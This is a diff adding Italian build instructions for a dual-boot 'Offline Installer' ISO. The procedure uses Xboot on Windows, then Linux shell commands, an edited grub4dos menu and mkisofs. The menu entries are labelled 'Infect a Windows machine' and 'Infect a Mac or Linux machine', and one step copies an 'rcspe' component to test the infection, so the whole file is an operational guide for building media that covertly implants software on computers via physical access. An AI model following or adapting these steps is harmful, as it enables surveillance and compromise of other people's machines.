@@ -1,0 +1,134 @@
+1) Procedura da Windows:
+
+	1) Scaricare ed installare Xboot da:
+
+		http://www.pendrivelinux.com/xboot-multiboot-iso-usb-creator/
+
+	2) Creare una nuova cartella sul Desktop chiamata ISO
+
+	3) Copiare l'eseguibile di Xboot dentro Desktop\ISO
+
+	4) Copiare le due ISO dell'Offline Install:
+
+		offlineinstallwin.iso
+		offlineinstalllin.iso
+
+	in Desktop\ISO
+
+	5) Aprire Xboot
+
+	6) Drag and drop offlineinstallwin.iso in Xboot
+
+	7) Scegliere:
+
+		Add using Grub4dos ISO Image Emulation
+
+	8) Cliccare su:
+
+		Add this file
+
+	9) Drag and drop offlineinstalllin.iso in Xboot
+
+	10) Scegliere
+
+		Linux ---- Ubuntu
+
+	11) Cliccare su:
+
+		Add this file
+
+	12) Rinominare:
+
+		Ubuntu -> offlineinstalllin in Xboot
+
+	13) Eliminare la Categoria (Linux)
+
+		Linux in offlineinstalllin in Xboot
+
+	14) Cliccare su:
+
+		Create ISO
+
+	15) Scegliere come nome xboot.iso e come posizione del salvataggio della nuova ISO:
+
+		Desktop\ISO\xboot.iso
+
+2) Procedura da Linux:
+
+	1) Eseguire:
+
+		$ mkdir work
+		$ cd work
+		$ mv /path/xboot.iso .
+		$ mkdir -p DualBootISO/Content
+		$ sudo mount -t iso9660 -o ro xboot.iso /media/
+		$ cp -Rf /media/* DualBootISO/Content/
+		$ umount /media
+		$ cd DualBootISO/Content/
+		$ sudo bash
+		$ chmod +w menu.lst
+
+	2) Modificare menu.lst come segue:
+
+		$ vim menu.lst
+
+		debug -1
+		write (md)0x220+1 !BAT\necho -n -P:0000 $[0133]      Offline Installer                                                 \0
+		initscript (md)0x220+1
+
+		/menuset 0 0 0 0 0 0    7   66    3    12  16
+
+		splashimage=/bkg.xpm.gz
+		foreground=A9A9A9
+		background=000000
+
+		### MENU START
+		title Windows\nInfect a Windows machine             
+		ls /images/offlineinstallwin.iso || find --set-root /images/offlineinstallwin.iso
+		map --heads=0 --sectors-per-track=0 /images/offlineinstallwin.iso (0xff) || map --heads=0 --sectors-per-track=0 --mem /images/offlineinstallwin.iso (0xff)
+		map --hook
+		chainloader (0xff)
+		### MENU END
+
+
+		### MENU START
+		title Mac & Linux\nInfect a Mac or Linux machine
+		ls /images/offlineinstalllin.iso || find --set-root /images/offlineinstalllin.iso
+		map --heads=0 --sectors-per-track=0 /images/offlineinstalllin.iso (0xff) || map --heads=0 --sectors-per-track=0 --mem /images/offlineinstalllin.iso (0xff)
+		map --hook
+		chainloader (0xff)
+		### MENU END
+
+	3) Copiare l'immagine del boot:
+
+		$ cd ../../
+		$ cp bkg.xpm.gz DualBootISO/Content/
+		$ cp menuset DualBootISO/Content/
+		$ chmod +x DualBootISO/Content/menuset
+		$ chmod -w DualBootISO/Content/menu.lst
+
+	4) Se si desidera provare l'infezione, copiare rcspe in:
+
+		$ cp -Rf rcspe DualBootISO/Content/
+
+	5) Eliminare:
+
+		$ cd DualBootISO/Content/
+		$ rm -Rf bcdw/ boot/ cdsh/ help/
+
+	6) Modificare le ISO corrette:
+
+		$ cd images/
+		$ rm offlineinstallwin.iso
+		$ rm offlineinstalllin.iso
+		$ rm -Rf images/
+
+		COPIARE DENTRO LE DUE ISO DA ME FATTE OVVERO: offlineinstallwin.iso offlineinstalllin.iso
+
+	7) Creare la ISO finale:
+
+		$ cd ../../../DualBootISO/
+		$ rm offlineinstall.iso
+		$ mkisofs -R -b grldr -no-emul-boot -boot-load-size 4 -o offlineinstall.iso Content
+
+	La ISO finale del dual boot sara' offlineinstall.iso
